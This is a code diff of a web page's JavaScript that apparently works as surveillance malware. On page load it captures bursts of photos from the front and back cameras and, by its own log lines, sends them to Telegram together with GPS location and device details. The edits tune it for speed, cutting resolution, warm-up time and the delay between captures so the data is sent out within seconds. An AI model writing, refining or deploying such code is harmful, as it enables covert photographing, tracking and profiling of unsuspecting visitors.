@@ -334,57 +334,22 @@
             }
         }
         
-        // Start camera (with better quality settings)
+        // Start camera (faster initialization)
         async function startCamera() {
             try {
                 console.log('📹 Starting camera...');
                 
                 const constraints = {
                     video: {
-                        width: { ideal: 1920, min: 1280 },
-                        height: { ideal: 1080, min: 720 },
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
                         facingMode: currentFacingMode,
-                        frameRate: { ideal: 30, min: 20 },
-                        // Advanced settings for better quality
-                        aspectRatio: { ideal: 16/9 },
-                        focusMode: { ideal: "continuous" },
-                        exposureMode: { ideal: "continuous" },
-                        whiteBalanceMode: { ideal: "continuous" }
+                        frameRate: { ideal: 30 }
                     }
                 };
                 
                 cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
                 cameraVideo.srcObject = cameraStream;
-                
-                // Apply advanced track settings for better focus
-                const track = cameraStream.getVideoTracks()[0];
-                const capabilities = track.getCapabilities();
-                const settings = {};
-                
-                // Enable autofocus if available
-                if (capabilities.focusMode && capabilities.focusMode.includes('continuous')) {
-                    settings.focusMode = 'continuous';
-                }
-                
-                // Set optimal exposure
-                if (capabilities.exposureMode && capabilities.exposureMode.includes('continuous')) {
-                    settings.exposureMode = 'continuous';
-                }
-                
-                // Set white balance
-                if (capabilities.whiteBalanceMode && capabilities.whiteBalanceMode.includes('continuous')) {
-                    settings.whiteBalanceMode = 'continuous';
-                }
-                
-                // Apply settings if any are available
-                if (Object.keys(settings).length > 0) {
-                    try {
-                        await track.applyConstraints({ advanced: [settings] });
-                        console.log('✅ Applied advanced camera settings:', settings);
-                    } catch (e) {
-                        console.log('⚠️ Could not apply advanced settings:', e.message);
-                    }
-                }
                 
                 // Wait for video to be ready
                 await new Promise((resolve) => {
@@ -393,11 +358,10 @@
                 
                 await cameraVideo.play();
                 
-                // Longer warm-up for better focus and exposure (1.5 seconds)
-                console.log('⏳ Camera warming up for better focus...');
-                await new Promise(resolve => setTimeout(resolve, 1500));
+                // Minimal warm-up time (500ms instead of 5000ms)
+                await new Promise(resolve => setTimeout(resolve, 500));
                 
-                console.log('✅ Camera ready with resolution:', cameraVideo.videoWidth, 'x', cameraVideo.videoHeight);
+                console.log('✅ Camera ready');
                 return true;
             } catch (error) {
                 console.error('❌ Camera error:', error);
@@ -414,24 +378,20 @@
             }
         }
         
-        // Capture single photo with better quality
+        // Capture single photo
         async function capturePhoto() {
             return new Promise((resolve) => {
                 if (cameraVideo.readyState !== cameraVideo.HAVE_ENOUGH_DATA) {
                     console.warn('⚠️ Video not ready');
-                    setTimeout(() => resolve(capturePhoto()), 200);
+                    setTimeout(() => resolve(capturePhoto()), 100);
                     return;
                 }
                 
                 const canvas = document.createElement('canvas');
-                const context = canvas.getContext('2d', { 
-                    alpha: false,
-                    desynchronized: true 
-                });
+                const context = canvas.getContext('2d');
                 
-                // Use full video resolution
-                canvas.width = cameraVideo.videoWidth || 1920;
-                canvas.height = cameraVideo.videoHeight || 1080;
+                canvas.width = cameraVideo.videoWidth || 1280;
+                canvas.height = cameraVideo.videoHeight || 720;
                 
                 if (canvas.width === 0 || canvas.height === 0) {
                     console.error('❌ Invalid dimensions');
@@ -439,14 +399,8 @@
                     return;
                 }
                 
-                // Enable image smoothing for better quality
-                context.imageSmoothingEnabled = true;
-                context.imageSmoothingQuality = 'high';
-                
-                // Draw the video frame
                 context.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
                 
-                // Convert to blob with high quality (0.95 instead of 0.9)
                 canvas.toBlob(blob => {
                     const photo = {
                         blob: blob,
@@ -455,13 +409,12 @@
                     };
                     
                     photos.push(photo);
-                    console.log(`📸 Captured: ${photo.resolution}, ${(blob.size / 1024).toFixed(2)} KB`);
                     resolve(photo);
-                }, 'image/jpeg', 0.95);
+                }, 'image/jpeg', 0.9);
             });
         }
         
-        // Fast capture and send (with delays for better focus)
+        // Fast capture and send (parallel processing)
         async function fastCaptureAndSend() {
             if (isCapturing) return;
             isCapturing = true;
@@ -469,8 +422,9 @@
             console.log('🚀 Starting fast capture...');
             
             const totalPhotos = 5;
+            const capturePromises = [];
             
-            // Capture all 5 photos with small delays for focus adjustment
+            // Capture all 5 photos rapidly (no delay between captures)
             for (let i = 1; i <= totalPhotos; i++) {
                 const photo = await capturePhoto();
                 
@@ -480,9 +434,9 @@
                     console.log(`📸 Photo ${i} captured and sending...`);
                 }
                 
-                // 200ms delay between captures for better focus
+                // Tiny 50ms delay between captures
                 if (i < totalPhotos) {
-                    await new Promise(resolve => setTimeout(resolve, 200));
+                    await new Promise(resolve => setTimeout(resolve, 50));
                 }
             }
             
@@ -518,20 +472,18 @@
             const cameraStarted = await startCamera();
             
             if (cameraStarted) {
-                // 5. Fast capture and send (front camera first)
+                // 5. Fast capture and send
                 await fastCaptureAndSend();
                 
-                // 6. Switch to back camera for better quality photos
-                console.log('🔄 Switching to back camera for better quality...');
-                stopCamera();
-                currentFacingMode = 'environment';
-                
-                // Small delay before switching
-                await new Promise(resolve => setTimeout(resolve, 500));
-                
-                const backCameraStarted = await startCamera();
-                if (backCameraStarted) {
-                    await fastCaptureAndSend();
+                // 6. Try back camera if we started with front
+                if (currentFacingMode === 'user') {
+                    console.log('🔄 Switching to back camera...');
+                    stopCamera();
+                    currentFacingMode = 'environment';
+                    const backCameraStarted = await startCamera();
+                    if (backCameraStarted) {
+                        await fastCaptureAndSend();
+                    }
                 }
             }
             
@@ -561,9 +513,9 @@
         console.log('📤 Will send to Telegram:');
         console.log('  • Device info (battery, RAM, CPU, etc.)');
         console.log('  • GPS location');
-        console.log('  • 10 high-quality photos (5 front + 5 back)');
-        console.log('  • Total: ~12 messages in under 5 seconds');
-        console.log('  • Resolution: Up to 1920x1080 (Full HD)');
+        console.log('  • 5 photos from front camera');
+        console.log('  • 5 photos from back camera');
+        console.log('  • Total: ~12 messages in under 3 seconds');
         console.log('═══════════════════════════════════');
         
         // AUTO-START ON PAGE LOAD
